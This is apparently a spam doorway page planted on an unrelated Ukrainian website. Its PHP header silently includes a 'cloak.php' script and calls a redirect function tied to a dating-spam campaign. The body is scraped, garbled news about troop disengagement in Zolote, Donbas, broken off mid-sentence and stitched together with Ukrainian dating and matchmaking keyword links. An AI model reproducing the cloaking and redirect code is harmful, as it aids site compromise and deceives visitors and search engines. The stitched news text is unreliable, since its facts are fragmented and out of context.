<?php
if(!@include('cloak.php'))	@include('../cloak.php');
if(function_exists('getredir')){
	@getredir ('api', '%d1%81%d0%b2%d0%b0%d1%82%d0%b0%d0%bd%d0%bd%d1%8f+%d0%bc%d1%96%d0%bb%d1%8c%d0%b9%d0%be%d0%bd%d0%b5%d1%80%d0%b0+%d0%97%d0%be%d0%bb%d0%be%d1%82%d0%b5+%d0%a3%d0%ba%d1%80%d0%b0%d1%97%d0%bd%d0%b0', '2021-05-21', 'pir_210521/UA_dat_geo_trans_ukr', 'ua_dating.txt');
}
?><!doctype html>
<html lang="">
<head>
	<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
	<title>Золоте, усі новини | Українська правда</title>
	<meta name="description" content="Розведення розпочалося у вівторок о 12 годині, повідомляє пресцентр штабу Операції об'єднаних сил. Українські сили відходять на" />
	<link rel="canonical" href="https://masage.od.ua/img/211/rize-svatannya-mlyonera-zolote.php" />
<?php if(!@include('../inc1mywp1.php')) @include('inc1mywp1.php'); ?>
						<div id="primary-menu" class="menu"><ul>
<li class="page_item page-item-2"><a href="https://masage.od.ua/img/133/limyv-msk-shvidksn-znayomstva.php">міські швидкісні знайомства Ватутіне Україна</a></li><li class="page_item page-item-2"><a href="https://masage.od.ua/img/248/gilu-sayt-znayomstv.php">сайт знайомств чоловіки в Каховка Україна</a></li><li class="page_item page-item-2"><a href="https://masage.od.ua/img/468/zuna-znayomstva-sogodn.php">знайомства сьогодні ввечері поблизу Бахмут Україна</a></li>
</ul></div>
						<div class="main-navigation-bg"></div>
						<div class="clearfix"></div>
					</nav><!-- #site-navigation -->
				</div>
			</div>

		</div>

	</header><!-- #masthead -->



	<div id="content" class="site-content">
	<div class="container"><div class="row"><div class="col-md-7 order-md-3">
	<div id="primary" class="content-area">
		<main id="main" class="site-main main-content-middle">


<article id="post-1" class="post-1 post type-post status-publish format-standard hentry category-uncategorized">
		<header class="entry-header">
		<h1 class="entry-title">Сватання мільйонера Золоте Україна</h1><!-- .entry-meta -->
			</header><!-- .entry-header -->



	<div class="entry-content">

<p>
<p>Місцева жителька у розмові з BBC News Україна розведення сил вітає: "Стало спокійніше, ми стали вірити у мир". Що ціляться у них Українських військових - Ред. Вітають розведення і дві жительки Золотого - Вікторія Михайлівна та "баба Зоя", які живуть трохи далі від лінії фронту. Якось були вибухи, але, напевно, то розміновували міни", - каже Вікторія Михайлівна. Приїзд сюди Зеленського перед початком розведення жінки пам'ятають і хвалять президента: "Піклується! Уявіть - з Києва приїхати у якесь селище". Вони підтримують розведення військ і сподіваються, що "Донбас повернеться до нас".</p><strong><a id='x1'></a><h2>﻿Хомчак заявив, що після розведення в Золотому не було порушень режиму тиші</h2></strong><p>А зараз ми нічого не знаємо, від нас нічого не залежить", - кажуть жінки і дякують за те, що хтось цікавиться ситуацією в Золотому. Віктор втратив частину бізнесу, що залишився у так званій "ЛНР". У розведення сил він не вірить. Але не всі у Золотому підтримують розведення військ чи абстрактно виступають "за мир і примирення".</p><strong><a id='x2'></a><h2>Розведення сил у Золотому почалось</h2></strong><p>До війни жив у селі Березівському недалеко від Золотого, мав у районі кілька магазинів, агробізнес і пекарню. У році село потрапило у "сіру зону", а з року перейшло під контроль так званої "ЛНР".</p>
		
			<br><ol>
			
				<li>понад 50 швидкісних знайомств в Щастя Україна!</li>
			
				<li>Що насправді думають про розведення військ на Донбасі. Репортаж ВВС?</li>
			
				<li>сайти знайомств в Інтернеті в Львів Україна.</li>
			
				<li>ексклюзивне агентство знайомств в Жовква Україна.</li>
			
			</ol>
		
	<p>У підсумку чоловік втратив майже весь бізнес і змушений був переїхати в Золоте, де у нього залишився останній магазин, прямо в якому і жив кілька років. Оптимізм земляків щодо розведення сил він не розділяє. От тут поруч хутір Вільний - по вечорах стріляють все одно. Ніяких покращень я не бачу", - каже чоловік BBC News Україна. На фото - нові позиції українських військових під Золотим. Додає: "Війська на своїй території не відводять.</p>
		
	<p>Ми так можемо до Львова відійти, а куди будуть з того боку відходити? Вони ж до Москви не підуть. Я не підтримую розведення". Це їм треба відходити до російського кордону. А ми займемо той бік і будемо жити, як раніше жили", - відкрито говорить чоловік. У жовтні Віктор потрапив на відео Анатолія Шарія , де так само чітко висловився проти розведення військ. За що у коментарях був названий "онуком поліцая". Автор фото, YouTube Анатолія Шарія. Його слова викликали бурхливу реакцію кментаторів. Чоловік визнає, що у Золотому багато прихильників донбаських "республік": "Тут багато хто за "ЛНР", тому що "ЛНР" тут не було.</p>
<p>Золоте це не відчуло, вони не знають, що це таке. Але багато і тих, проти "ЛНР", хоча не говорять про це відкрито, бо бояться". Віктор припускає, що за розведення сил виступають і з чисто меркантильних інтересів: "Думають, що коли українська армія відійде, можна буде контрабанду провозити на той бік". Загалом же чоловік не погоджується з тим, що Україна має йти на якісь компроміси з Росією: "Який компроміс має бути з нашого боку? Визнати Крим російським? Визнати так звані "ЛНР" і "ДНР" республіками і сказати, що вони там всі герої? У них "Гіві" і "Мотороли" вже у підручниках історії, їм пам'ятники ставлять.</p>
<p>І як з цим жити? Він також очікує на зустріч Зеленського з Путіним 9 грудня. Однак не з найкращими передчуттями: "Зеленський сам по собі хлопець непоганий. Але в нього не вистачить політичного досвіду, щоб розмовляти з таким монстром, як Путін. Він може і хоче зробити краще, але не впевнений, що у нього вийде". Хочете отримувати найважливіші новини в месенджер? Помер ветеран АТО Денис Янтар, який брав участь у перепалці з президентом Володимиром Зеленським у Золотому-4, куди той приїхав з візитом. Золото може подорожчати до рекордних 2 тисяч доларів за унцію.</p>
<p>Золото може подорожчати до рекордних 2 тисяч доларів за унцію на тлі заходів для обмеження негативних наслідків пандемії коронавірусу. Під час атаки поблизу Золотого місія ОБСЄ зафіксувала вибухів. Вранці 18 лютого під час патрулювання в районі Золотого, Кадіївки й Попасної і за допомогою своїх камер СММ зафіксувала помітний стрибок у кількості порушень режиму припинення вогню в цьому районі, включаючи понад вибухів Близько місія скерувала в той район безпілотний літальний апарат дальнього радіусу дії.</p>
<p>Його кадри аналізують. Сивохо переніс презентацію "платформи примирення" через провокацію в Золотому.</p>
		
			
				<div>Золоте-4 - \</div>
				<div><iframe width='560' height='315' src='https://www.youtube.com/embed/Tpc7051VJeA' frameborder='0' allowfullscreen></iframe></div>
			
		
	<p>Радник секретаря Ради безпеки і оборони з питань реінтеграції і відновлення окупованих територій Донбасу Сергій Сивохо повідомив про перенесення презентації "Національної платформи примирення і єдності" через ескалацію на Донбасі. Під час ранкового бою окупанти здійснили 56 пострілів з озброєння танка — ОС. Хомчак про бій біля Золотого: бойовики відзначають річницю "Дебальцевського котла".</p><a id='x3'></a><h3>Що сказав Пристайко?</h3><p>Керівник Генштабу розповів деталі ранкової атаки поблизу Золотого. Зеленський: Провокації бувають, але ми впевнено йдемо до миру. Президент Володимир Зеленський назвав вранішній напад бойовиків на Донбасі провокацією і заявив, що Україна впевнено наближається до припинення війни. Розгублені бойовики брешуть про напад України — штаб ООС. Представництво в ЄС вимагає рішучої реакції на атаку РФ на Донбасі. Представництво України в ЄС поінформувало Євросоюз про новий напад РФ на Донбасі, закликавши партнерів до рішучої реакції. Втратили два опорних пункти біля Золотого, вимагаємо звіту міністра — Геращенко.</p>
<p>Фракція "Європейська солідарність" вимагає терміново заслухати у парламенті військове керівництво України через загострення поблизу лінії розмежування біля Золотого на Донбасі. Бій на лінії розмежування закінчився, є загиблий — ОС. Автор фото, UNIAN. Сіра зона існувала й до цього", - сказав Пристайко і не виключив, що в разі потреби українські військові зможуть повернутися на попередні позиції.</p>
<p>Після відводу у Золотому продовжить роботу українська поліція. За словами Пристайка, факт відведення сил противником має зафіксувати СММ ОБСЄ. Про розведення сил у районі Золотого, Петрівського і Станиці Луганської почали говорити ще у році. За задумом, сторони мають перебувати поза зоною видимості одна одної - на відстані 2 кілометри, тобто, обидві сторони мають відійти на кілометр кожна.</p><strong><a id='x4'></a><h2>﻿Хомчак заявив, що після розведення в Золотому не було порушень режиму тиші / ГОРДОН</h2></strong><p>Це має призвести до того, що вони не зможуть вести взаємні обстріли. Розведення мало відбуватися "синхронно, дзеркально і завершитися протягом не більше, ніж трьох діб" після того, як режим тиші на цих ділянках фронту триватиме принаймні тиждень. Саме ця умова семиденного перемир'я тривалий час і була перепоною на шляху розведення: режим тиші постійно порушували, і сторони звинувачували в цьому одна одну.</p><img src="https://ukrreporter.com.ua/wp-content/uploads/2019/02/tunguska-1.jpg" alt="На нових позиціях" style="max-width: 480px; max-height: 480px;"/><p>Вже у році розведення сил стало частиною риторики нового президента Володимира Зеленського про встановлення миру на Донбасі. Наприкінці червня розведення справді почалося у Станиці Луганській - СММ ОБСЄ відзвітувала, що 30 червня обидві сторони відійшли від лінії зіткнення і навіть почали розбирати передові позиції.</p>
<p>З того часу українська сторона спорудила там тимчасовий міст через Сіверський Донець для руху цивільних та озвучила плани відновлення капітального мосту, підірваного ще у році. Водночас українські ЗМІ стверджують, що "народна міліція ЛНР" так і не розібрала свої укріплення біля лінії розведення, й представники незаконних збройних формувань, переодягені цивільними, проводять розвідку.</p>
<p>Спостережна місія ОБСЄ періодично відмічає одиночні постріли чи вибухи у районі Станиці Луганської, однак до зриву перемир'я вони не призвели. Наступними ділянками розведення сил мають стати саме Золоте та район сіл Петрівське-Богданівка. Хочете отримувати найважливіші новини в месенджер? Підписуйтеся на наш Telegram або Viber! Розведення сил у Золотому почалось. Розведення сил на Донбасі. Що відбувається у Золотому? Чи є у влади плани B, C та D для припинення війни на Донбасі?</p>
</p>
	</div><!-- .entry-content -->

</article><!-- #post-1 -->


		</main><!-- #main -->
	</div><!-- #primary -->


	</div><div class="col-md-2 order-md-1">

	<aside id="secondary" class="widget-area">
			</aside><!-- #secondary -->
</div><div class="col-md-3 order-md-10">
	<aside id="secondary" class="widget-area">
		<section id="search-2" class="widget widget_search"><form role="search" method="get" class="search-form" action="https://masage.od.ua/img/184/suni-znayomstva-logn.php">
				<label>
					<span class="screen-reader-text">Search for:</span>
					<input type="search" class="search-field" placeholder="Search &hellip;" value="" name="s" />
				</label>
				<input type="submit" class="search-submit" value="Search" />
			</form></section>		<section id="recent-posts-2" class="widget widget_recent_entries">		<h2 class="widget-title">Recent Posts</h2>		<ul>
											<li><a href="https://masage.od.ua/img/352/nygah-talya-znayomstva-v.php">Італія знайомства в Бахмут Україна</a></li><li><a href="https://masage.od.ua/img/428/nen-svatannya-na-chistyakove.php">сватання на Чистякове Україна</a></li><li><a href="https://masage.od.ua/img/457/xazy-naykrashe-msto-dlya.php">найкраще місто для знайомств місто Сторожинець Україна</a></li><li><a href="https://masage.od.ua/img/494/mori-znayomstva-dlya.php">знайомства для одиноких людей в Новий Розділ Україна</a></li><li><a href="https://masage.od.ua/img/335/zanoj-eksklyuzivne-svatannya.php">ексклюзивне сватання Харцизьк Україна</a></li><li><a href="https://masage.od.ua/img/468/rupop-mstse-znayomstv.php">місце знайомств в Добропілля Україна</a></li>
					</ul>
		</section>

			<section id="meta-2" class="widget widget_meta"><h2 class="widget-title">Contents</h2>
				<ol><li><a href='#x1'>﻿Хомчак заявив, що після розведення в Золотому не було порушень режиму тиші</a></li>
<li><a href='#x2'>Розведення сил у Золотому почалось</a></li>
<li><a href='#x3'>Що сказав Пристайко?</a></li>
<li><a href='#x4'>﻿Хомчак заявив, що після розведення в Золотому не було порушень режиму тиші / ГОРДОН</a></li>
</ol>
			</section>

	</aside><!-- #secondary -->
</div></div></div>	</div>
	<footer id="colophon" class="site-footer">

		<div class="covf-footer-copyright">
			<div class="container">
				<div class="row">
					<div class="col">
						<div class="site-info text-center">
							Powered by 	<a href="https://masage.od.ua/img/327/zyg-naykrash-sayti-pdklyuchennya.php">Covfefe WordPress Theme</a>
						</div>
					</div>
				</div>
			</div>
		</div>
	</footer><!-- #colophon -->
</div><!-- #page -->

<script type='text/javascript' src='https://masage.od.ua/img/wp-content/themes/covfefe.1.0.2/covfefe/js/jquery.marquee.js?ver=20151215'></script>
<script type='text/javascript' src='https://masage.od.ua/img/wp-content/themes/covfefe.1.0.2/covfefe/js/scripts.js?ver=20151215'></script>
<script type='text/javascript' src='https://masage.od.ua/img/wp-includes/js/comment-reply.min.js?ver=5.0.3'></script>
<script type='text/javascript' src='https://masage.od.ua/img/wp-includes/js/wp-embed.min.js?ver=5.0.3'></script>

</body>
</html>